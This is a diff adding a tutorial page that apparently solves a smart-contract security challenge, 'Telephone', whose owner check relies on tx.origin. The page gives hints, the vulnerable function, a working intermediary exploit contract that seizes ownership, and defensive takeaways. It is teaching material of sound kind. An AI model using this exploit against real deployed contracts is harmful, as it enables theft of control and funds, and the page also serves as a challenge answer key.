@@ -1,0 +1,82 @@
+---
+title: "Challenge #4: Telephone"
+sidebar:
+    order: 4
+---
+
+import Hint from "@components/Hint.astro";
+import Solution from "@components/Solution.astro";
+import Conclusion from "@components/Conclusion.astro";
+
+In this challenge, you need to claim ownership of the `Telephone` contract by exploiting its `changeOwner` function.
+
+## Hints
+
+<Hint index={1}>
+    The `changeOwner` function in the `Telephone` contract checks if `tx.origin` is different from `msg.sender`. What is the difference between `tx.origin` and `msg.sender`?
+</Hint>
+
+<Hint index={2}>
+    Consider how you might call the `changeOwner` function from a different contract. How would that affect the values of `tx.origin` and `msg.sender`?
+</Hint>
+
+## Solution
+
+<Solution>
+    The `Telephone` contract's `changeOwner` function checks if `tx.origin` is different from `msg.sender` before allowing the owner to be changed. Here's the relevant part of the contract:
+
+    ```solidity
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+    ```
+
+    To exploit this, you need to call the `changeOwner` function from another contract. This way, `tx.origin` will be the address that initiated the transaction (your address), and `msg.sender` will be the address of the contract that you use to call `changeOwner`.
+
+    Here is a simple exploit contract that can achieve this:
+
+    ```solidity
+    pragma solidity ^0.6.0;
+
+    import './Telephone.sol';
+
+    contract TelephoneExploit {
+        Telephone public telephoneContract;
+
+        constructor(address _telephoneAddress) public {
+            telephoneContract = Telephone(_telephoneAddress);
+        }
+
+        function exploit(address _newOwner) public {
+            telephoneContract.changeOwner(_newOwner);
+        }
+    }
+    ```
+
+    Deploy this exploit contract with the address of the `Telephone` contract. Then call the `exploit` function with your address as the `_newOwner` parameter. This will change the owner of the `Telephone` contract to your address.
+</Solution>
+
+## Conclusion
+
+<Conclusion>
+    <Fragment slot="takeaways">
+        This challenge demonstrates the importance of understanding the difference between `tx.origin` and `msg.sender`. Key takeaways include:
+
+        1. `tx.origin` refers to the original external account that initiated the transaction, while `msg.sender` refers to the immediate account (contract or external) that called the function.
+        2. Using `tx.origin` for authorization checks can be dangerous and is generally discouraged because it can be manipulated through intermediate contracts.
+        3. Always prefer `msg.sender` for access control checks to ensure that the correct entity is authorized to perform actions.
+
+        These concepts are crucial for developing secure smart contracts and preventing unauthorized access.
+    </Fragment>
+
+    <Fragment slot="hacks">
+        The [Mist wallet](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks) used `tx.origin` for authentication, which led to a vulnerability that allowed an attacker to steal funds from users. The attacker would trick the user into interacting with a malicious contract that would call the Mist wallet contract using the user's `tx.origin`, thereby bypassing the authentication checks.
+    </Fragment>
+
+    <Fragment slot="resources">
+        - [Solidity Documentation on Global Variables](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties) - This link provides information on `tx.origin`, `msg.sender`, and other global variables.
+        - [Smart Contract Security Best Practices](https://consensys.github.io/smart-contract-best-practices/) - A guide to best practices for securing smart contracts, including proper access control methods.
+    </Fragment>
+</Conclusion>
